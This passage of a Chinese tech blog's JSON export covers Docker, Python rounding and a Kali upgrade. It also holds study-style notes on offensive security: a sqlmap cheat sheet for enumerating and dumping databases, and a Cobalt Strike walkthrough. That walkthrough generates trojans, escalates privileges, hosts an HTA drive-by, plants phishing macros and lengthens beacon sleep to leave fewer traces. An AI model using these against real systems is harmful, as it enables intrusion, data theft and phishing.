2，等待升级完就ok了","categories":[{"name":"环境配置","slug":"环境配置","permalink":"/categories/环境配置/"}],"tags":[{"name":"kali","slug":"kali","permalink":"/tags/kali/"}],"keywords":[{"name":"环境配置","slug":"环境配置","permalink":"/categories/环境配置/"}]},{"title":"docker部署","slug":"docker部署","date":"2021-11-10T08:00:00.000Z","updated":"2023-04-14T15:45:05.484Z","comments":true,"path":"2021/11/10/docker部署/","link":"","permalink":"/2021/11/10/docker部署/","excerpt":"","text":"Ngnix部署1，拉取镜像docker pull ngnix 2，运行容器docker run -it --name [nginx01] -p 3344:80 nginx 3，进入nginx容器docker exec -it nginx01 /bin/bash","categories":[{"name":"docker","slug":"docker","permalink":"/categories/docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"/tags/docker/"}],"keywords":[{"name":"docker","slug":"docker","permalink":"/categories/docker/"}]},{"title":"python print保留小数问题","slug":"python保留小数问题","date":"2021-11-01T08:00:00.000Z","updated":"2023-04-14T15:47:13.474Z","comments":true,"path":"2021/11/01/python保留小数问题/","link":"","permalink":"/2021/11/01/python保留小数问题/","excerpt":"","text":"1,round()函数语法：round( x [, n] ) 注： x – 数值表达式。 n – 数值表达式，表示从小数点位数。 例如保留两位小数 round()如果只有一个数作为参数，不指定位数的时候，则返回一个整数 但是此函数含有缺点1,有时无法正确地四舍五入。（1）当小数点为一位的数，作为参数时，且不指定位数的时候：例如round(2.4),round(2.4) 如果出现.5的情况，例如round(3.5) round(12.5)时会出现这种情况 原因： 在python2.7中,round()保留值将保留到离上一位更近的一端（四舍六入）,如果距离两端一样远，则保留到离0远的一边。所以round(0.5)会近似到1，而round(-0.5)会近似到-1。 但是到了python3.5 如果距离两边一样远，会保留到偶数的一边。比如round(0.5)和round(-0.5)都会保留到0,round(1.5)会保留到2。 （2）当指定位数时（除了，当只有一位小数时，而位数选择为零。这时候遵循的原则为（1）），这时python2与3都是四舍五入。可是当输入round(2.675,2)理论来讲应该输出为2.68。可是它偏偏输出为2.67。这跟浮点数的精度有关。我们知道在机器中浮点数不一定能精确表达，因为换算成一串1和0后可能是无限位数的，机器已经做出了截断处理。那么在机器中保存的2.675这个数字就比实际数字要小那么一点点。这一点点就导致了它离2.67要更近一点点，所以保留两位小数时就近似到了2.67。 像这种情况，以小数点后一位为5时的数字，有很多（大家可以观察后两位小数，能发现有的进一了有的没有，原因就是（2）例如： 2，round会自动舍去末尾的零，2，ceil函数语法：import math math.ceil(x) 注：1，ceil()是不能直接被访问的，需要导入math模块，其中x是参数 ​ 2，ceil()只返回整数 ​ 3，ceil()函数返回值是上入整数，可以这么理解 在正数时无论小数是几，它所返回的值为在原本的整数上加一，负数时，无论小数是几，它所返回的值还是原本的整数。 举例： 3，floor()函数语法：import math math.floor( x ) 注：1，floor()是不能直接被访问的，需要导入math模块，其中x是参数 ​ 2，floor()只返回整数 ​ 3，floor()函数返回值是下舍取整，可以这么理解 在正数时无论小数是几，它所返回的值还是原本的整数，负数时，无论小数是几，它所返回的值是原本的整数加一。 举例： 4，modf()函数语法：import math math.modf( x ) 注：1，modf()是不能直接被访问的，需要导入math模块，其中x是参数 ​ 2，modf()返回整数,和它的小数（这个函数不是保留小数的函数，但出于喜好还是写在了这里） 举例： 缺点：大家看到例子，也发现了这个问题它返回的小数部分不是很准确。这就是modf()函数的缺点 5，format()函数1，语法：&quot;{} {}&quot;.format(&quot;hello&quot;, &quot;world&quot;) 举例： 2，可以设置参数举例： print(&quot;名字：{name}, 地址 {url}&quot;.format(name=&quot;eriseda&quot;, url=&quot;eriseda.com&quot;)) 3，数字格式化 举例：保留小数 print(&quot;{:.2f}&quot;.format(3.99999))#保留两位小数 print(&quot;{:.3f}&quot;.format(3.55555))#保留三位小数","categories":[{"name":"python","slug":"python","permalink":"/categories/python/"}],"tags":[],"keywords":[{"name":"python","slug":"python","permalink":"/categories/python/"}]},{"title":"sqlmap的使用方法","slug":"sqlmap","date":"2021-11-01T08:00:00.000Z","updated":"2023-04-14T15:48:17.696Z","comments":true,"path":"2021/11/01/sqlmap/","link":"","permalink":"/2021/11/01/sqlmap/","excerpt":"","text":"(1)python sqlmap.py-u“url” #检测目标网站是否存在注入 (2)python sqlmap.py-u“url” --dbs #获取对方数据库所有库的名称 (3)python sqlmap.py-u “url” -D “security&quot;--tables #获取security库下的表 (4)python sqlmap.py-u “url” -D “securtiy&quot;-T “emails,users&quot; --columns #获取eamil表，users表中的字段 (5)python sqlmap.py -u“url” -D“securtiy&quot;-T “uses&quot; -C“id,username,password” --dump#导出数据指定数据 (6)python sqlmap.py-u“url”--dump-all#拖库 (7)python sqlmap.py-u&quot;url&quot;--current-user #获取当前用户名称 (8)python sqlmap.py -u “url” --current-db#获取当前使用的数据名称 (9)python sqlmap.py -r 1.txt #指定文件检测注入 (10)python sqlmap.py -u “url” --dbms“mysql”#指定数据库类型进行检测 (11)python sqlmap.py -r 1.txt -p“参数名”#post型注入，-p指定哪个参数注入 (12)python sqlmap.py -u“url” --forms#自动搜索表单 并测试注入 (13)python sqlmap.py -u“url” -dbs-v4#显示sqlmap注入的信息有七个等级默认是一 0、只显示python错误以及严重的信息。 1、同时显示基本信息和警告信息。(默认) 2、同时显示debug信息。 3、同时显示注入的payload4、同时显示HTTP请求。 5、同时显示HTTP响应头。 6、同时显示HTTP响应页面 (14)python sqlmap.py -U“url” --tamper unmagicquotes#检测宽字节注入 (15)python sqlmap.py -u“url” -is-dba #判断当前用户是否为数据库管理员权限 (16)python sqlmap.py -u“url” --random-agent #随机UA头 (17)探测等级参数：-level 共有五个等级，默认为1级..这个参数不仅影响使用哪些payload同时也会影响测试的注入点，GET和POST的数据都会测试，HTTP Cookie在level为2的时候就会测试，HTTPUser-Agent/Referer头在level为3的时候就会测试。总之在你不确定哪个payload或者参数为注入点的时候，为了保证全面性，建议使用高的level值。 python sqlmap.py -u“url”--cookie &quot;cookie value&quot;--level 2 (18)风险等级参数：-risk 共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。 (19)python sqlmap.py -u“url” --users#列数据库用户 (20)python sqlmap.py -u“url” -batch #采用默认配置对提示进行设置 (21)python sqlmap.py -u&quot;url&quot;-roles 或者--privileges #列用户以及权限 (22)伪静态注入： 使用sqlmap进行伪静态注入 python sqlmap.py.py -u&quot;www.xx.com/index.php/news/id/203*.html&quot; python sqlmap -u&quot;www.xx.com/index.php/news/id/10*&quot;","categories":[{"name":"ctf","slug":"ctf","permalink":"/categories/ctf/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"/tags/sql注入/"}],"keywords":[{"name":"ctf","slug":"ctf","permalink":"/categories/ctf/"}]},{"title":"sqllab关卡以及相关知识","slug":"sql","date":"2021-11-01T08:00:00.000Z","updated":"2023-04-15T14:39:17.202Z","comments":true,"path":"2021/11/01/sql/","link":"","permalink":"/2021/11/01/sql/","excerpt":"","text":"","categories":[{"name":"ctf","slug":"ctf","permalink":"/categories/ctf/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"/tags/sql注入/"}],"keywords":[{"name":"ctf","slug":"ctf","permalink":"/categories/ctf/"}]},{"title":"docker常用命令","slug":"docker命令","date":"2021-06-21T08:00:00.000Z","updated":"2023-04-14T15:45:45.088Z","comments":true,"path":"2021/06/21/docker命令/","link":"","permalink":"/2021/06/21/docker命令/","excerpt":"","text":"启用dockersystemctl start docker 关闭dockersystemctl stop docker 镜像命令docker images # 列出本地主机上的镜像 [root@localhost ~]# docker images REPOSITORY TAG IMAGE ID CREATED SIZE # 解释 REPOSITORY 镜像的仓库源 TAG 镜像的标签 IMAGE ID 镜像的ID CREATED 镜像创建时间 SIZE 镜像大小 # 同一个仓库源可以有多个 TAG，代表这个仓库源的不同版本，我们使用REPOSITORY：TAG 定义不同 的镜像，如果你不定义镜像的标签版本，docker将默认使用 lastest 镜像！ # 可选项 -a： 列出本地所有镜像 -q： 只显示镜像id --digests： 显示镜像的摘要信息 docker search # 搜索镜像(以MySQL为例) [root@localhost ~]# docker search mysql NAME DESCRIPTION STARS OFFICIAL mysql MySQL is a widely used, open-source relation… 9484 [OK] # docker search 某个镜像的名称 对应DockerHub仓库中的镜像 # 可选项 --filter=stars=50 ： 列出收藏数不小于指定值的镜像。 docker pull # 下载镜像 [root@localhost ~]# docker pull mysql Using default tag: latest # 不写tag，默认是latest latest: Pulling from library/mysql 54fec2fa59d0: Already exists # 分层下载 bcc6c6145912: Already exists 951c3d959c9d: Already exists 05de4d0e206e: Already exists 319f0394ef42: Already exists d9185034607b: Already exists 013a9c64dadc: Already exists 42f3f7d10903: Pull complete c4a3851d9207: Pull complete 82a1cc65c182: Pull complete a0a6b01efa55: Pull complete bca5ce71f9ea: Pull complete Digest: sha256:61a2a33f4b8b4bc93b7b6b9e65e64044aaec594809f818aeffbff69a893d1944 # 签名 Status: Downloaded newer image for mysql:latest docker.io/library/mysql:latest # 真实位置 # 指定版本下载 [root@localhost ~]# docker pull mysql:5.7 docker rmi # 删除镜像 docker rmi -f 镜像id # 删除单个 docker rmi -f 镜像名:tag 镜像名:tag # 删除多个 docker rmi -f $(docker images -qa) # 删除全部 容器命令说明：有镜像才能创建容器，我们这里使用 centos 的镜像来测试，就是虚拟一个 centos docker pull centos#拉取镜像 新建容器并启动 # 命令 docker run [OPTIONS] IMAGE [COMMAND][ARG...] # 常用参数说明 --name=&quot;Name&quot; # 给容器指定一个名字 -d # 后台方式运行容器，并返回容器的id！ -i # 以交互模式运行容器，通过和 -t 一起使用 -t # 给容器重新分配一个终端，通常和 -i 一起使用 -P # 随机端口映射（大写） -p # 指定端口映射（小结），一般可以有四种写法: ip:hostPort:containerPort ip::containerPort hostPort:containerPort (常用) containerPort # 测试 [root@localhost ~]# docker images REPOSITORY TAG IMAGEID CREATED SIZE centos latest 470671670cac 3 months ago 237MB # 使用centos进行用交互模式启动容器，在容器内执行/bin/bash命令！ [root@localhost ~]# docker run -it centos /bin/bash [root@dc8f24dd06d0 /]# ls # 注意地址，已经切换到容器内部了！ bin etc lib lost+found mnt proc run srv tmp var dev home lib64 media opt root sbin sys usr [root@dc8f24dd06d0 /]# exit # 使用 exit 退出容器 exit [root@localhost ~]# 列出所有运行的容器 # 命令 docker ps [OPTIONS] # 常用参数说明 -a # 列出当前所有正在运行的容器 + 历史运行过的容器 -l # 显示最近创建的容器 -n=? # 显示最近n个创建的容器 -q # 静默模式，只显示容器编号。 退出容器 exit # 容器停止退出 ctrl+P+Q # 容器不停止退出 删除容器 docker rm 容器id # 删除指定容器 docker rm -f $(docker ps -a -q) # 删除所有容器 docker ps -a -q|xargs docker rm # 删除所有容器 运行已有且已关闭的容器 docker start [容器id或容器名字] 进入正在运行的容器 # 命令1 docker exec -it 容器id /bin/bash # 测试1 [root@localhost ~]# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES c8530dbbe3b4 centos &quot;/bin/sh -c &#39;while t…&quot; 12 minutes ago Up 12 minutes happy_chaum [root@localhost ~]# docker exec -it c8530dbbe3b4 /bin/bash [root@c8530dbbe3b4 /]# ps -ef UID PID PPID C STIME TTY TIME CMD root 1 0 0 08:43 ? 00:00:00 /bin/sh -c while true;do echo localhost;sleep root 751 0 0 08:56 pts/0 00:00:00 /bin/bash root 769 1 0 08:56 ? 00:00:00 /usr/bin/coreutils -- coreutils-prog-shebang=s root 770 751 0 08:56 pts/0 00:00:00 ps -ef # 命令2 docker attach 容器id # 测试2 [root@localhost ~]# docker exec -it c8530dbbe3b4 /bin/bash [root@c8530dbbe3b4 /]# ps -ef UID PID PPID C STIME TTY TIME CMD root 1 0 0 08:43 ? 00:00:00 /bin/sh -c while true;do echo localhost;sleep root 856 0 0 08:57 pts/0 00:00:00 /bin/bash root 874 1 0 08:57 ? 00:00:00 /usr/bin/coreutils -- coreutils-prog-shebang=s root 875 856 0 08:57 pts/0 00:00:00 ps -ef # 区别 # exec 是在容器中打开新的终端，并且可以启动新的进程 # attach 直接进入容器启动命令的终端，不会启动新的进程 从容器内拷贝文件到主机上 # 命令 docker cp 容器id:容器内路径 目的主机路径 # 测试 # 容器内执行，创建一个文件测试 [root@c8530dbbe3b4 /]# cd /home [root@c8530dbbe3b4 home]# touch f1 [root@c8530dbbe3b4 home]# ls f1 [root@c8530dbbe3b4 home]# exit exit # linux复制查看，是否复制成功 [root@localhost ~]# docker cp c8530dbbe3b4:/home/f1 /home [root@localhost ~]# cd /home [root@localhost home]# ls f1 小结attach Attach to a running container # 当前 shell 下attach 连接指定运行镜像 build Build an image from a Dockerfile # 通过 Dockerfile 定 制镜像 commit Create a new image from a container changes # 提交当前容器为新的镜像 cp Copy files/folders from the containers filesystem to the host path #从容器中拷贝指定文件或者目录到宿主机中 create Create a new container # 创建一个新的容器，同 run，但不启动容器 diff Inspect changes on a container&#39;s filesystem # 查看 docker 容器变化 events Get real time events from the server # 从 docker 服务获取容器实时事件 exec Run a command in an existing container # 在已存在的容器上运行命令 export Stream the contents of a container as a tar archive # 导出容器的内容流作为一个 tar 归档文件[对应 import ] history Show the history of an image # 展示一个镜像形成历史 images List images # 列出系统当前镜像 import Create a new filesystem image from the contents of a tarball # 从tar包中的内容创建一个新的文件系统映像[对应export] info Display system-wide information # 显示系统相关信息 inspect Return low-level information on a container # 查看容器详细信息 kill Kill a running container # kill 指定 docker 容器 load Load an image from a tar archive # 从一个 tar 包中加载一个镜像[对应 save] login Register or Login to the docker registry server # 注册或者登陆一个docker 源服务器 logout Log out from a Docker registry server # 从当前 Docker registry 退出 logs Fetch the logs of a container # 输出当前容器日志信息 port Lookup the public-facing port which is NAT-ed to PRIVATE_PORT # 查看映射端口对应的容器内部源端口 pause Pause all processes within a container # 暂停容器 ps List containers # 列出容器列表 pull Pull an image or a repository from the docker registry server #从docker镜像源服务器拉取指定镜像或者库镜像 push Push an image or a repository to the docker registry server #推送指定镜像或者库镜像至docker源服务器 restart Restart a running container # 重启运行的容器 rm Remove one or more containers # 移除一个或者多个容器 rmi Remove one or more images # 移除一个或多个镜像[无容器使用该镜像才可删除，否则需删除相关容器才可继续或 -f 强制删除] run Run a command in a new container # 创建一个新的容器并运行一个命令 save Save an image to a tar archive # 保存一个镜像为一个tar 包[对应 load] search Search for an image on the Docker Hub # 在 docker hub 中搜索镜像 start Start a stopped containers # 启动容器 stop Stop a running containers # 停止容器 tag Tag an image into a repository # 给源中镜像打标签 top Lookup the running processes of a container # 查看容器中运行的进程信息 unpause Unpause a paused container # 取消暂停容器 version Show the docker version information # 查看 docker 版本号 wait Block until a container stops, then print its exit code # 截取容 器停止时的退出状态值","categories":[{"name":"docker","slug":"docker","permalink":"/categories/docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"/tags/docker/"}],"keywords":[{"name":"docker","slug":"docker","permalink":"/categories/docker/"}]},{"title":"conbalt strike","slug":"cs使用方法","date":"2021-01-10T08:00:00.000Z","updated":"2023-04-14T15:44:43.285Z","comments":true,"path":"2021/01/10/cs使用方法/","link":"","permalink":"/2021/01/10/cs使用方法/","excerpt":"","text":"Conbalt Strike前言：cs是基于Java环境并且需要选好jdk的版本环境，例如： Oracle Java 1.8，Oracle Java 11, 或 OpenJDK 11一,teamsever文件首先cs需要一个服务端，我们可以打开一个虚拟机/服务器（这里以虚拟机centos系统为例）将cs的整个文件件传输到虚拟机里面，打开目录会发现含有一个teamsever文件，之后赋予teamsever执行权限输入命令：chomd +x teamsever 之后执行teamsever文件./teamsever [虚拟机ip] [密码] 二，打开Windows中的cs1，host填入ip即可 ，端口默认 ，user随便起，密码填入刚才设定好的密码。填好之后直接connect 2，此时可能就会遇到一个问题，发现连接超时！！！此时就需要关闭虚拟机的防火墙以centos为例，输入下面命令：（附上打开）systemctl stop firewalld （临时关闭） systemctl start firewalld （临时打开） 注意：这只是暂时关闭防火墙，重启客户端防火墙又会默认开启如果需要关闭开机自启防火墙输入下面命令：（附上打开）systemctl disable firewalld （关闭防火墙） systemctl enable firewalld （打开） 3，这时候我们会进入cs中 4，此时我们需要设置一个监听器，在cobalt strike中有一个listeners选项，之后点击add添加监听器，（这里是我之前已经添加的一个监听器，） name随便起 ，http hosts，点击+填入虚拟机ip地址，http port（c2）中选择一个没有被占用的端口。其他选项默认即可。之后save，之后监听器则添加成功，三，生成木马，上线cs1，点击attacks选项，如图操作，生成exe木马， 监听器listener选择刚才我们添加的监听器即可，其他选项默认。之后点击generate，保存一个位置，此时已经生成了一个exe木马文件，此时我们将其木马文件拖入到我们靶机的中，当点击靶机中我们拖入的木马。此时我们cs中会产生回连。此时说明我们的cs上线成功了。 四，提权1，设置心跳时间，右键我们的回弹地址，之后如图操作，找到sleep，此时默认回连时间为60秒，如果实战环境中建议将心跳时间调长一些，这样痕迹不会太明显，这里我们做测试将其调为2秒。 2，还是右键，找到elevate选项点击， 还是监听器选择之前设点好的，我这个cs有两种提权方式，这里我选择了第二个，很简单因为我第一个没成功。。。 之后提权成功后会回弹一个新的会话， 之后就可以正常操作了。五，网页克隆，点击attacks找到clone site， 2，输入想要克隆的地址，其他默认即可。之后访问我们的IP地址就会看到我们所克隆的网页。 六，挂载网页木马，实现钓鱼1，首先需要我们生成一个hta木马，找到html生成木马文件，和生成exe木马操作一样，这里不做赘述。生成之后进行挂载，如图操作， 2，选择刚生成的hta的木马，url我们可以选择在根目录下。之后其他默认。 launch之后我们则以及挂载成功。当对方访问此网站时会自动下载木马，七，挂在宏文件，实现钓鱼1，还是需要生成一个宏文件木马，找到ms office macro，操作与上述一样。这时候将生成好的宏代码点击copy macro复制， 2，这时候需要创建一个word文档，在视图中点击宏，创建一个宏文件，将里面自带源代码替换为我们的宏代码。 之后将其保存，当目标打开该文件时，cs就会上线。","categories":[{"name":"工具的使用","slug":"工具的使用","permalink":"/categories/工具的使用/"}],"tags":[{"name":"cs","slug":"cs","permalink":"/tags/cs/"}],"keywords":[{"name":"工具的使用","slug":"工具的使用","permalink":"/categories/工具的使用/"}]}]}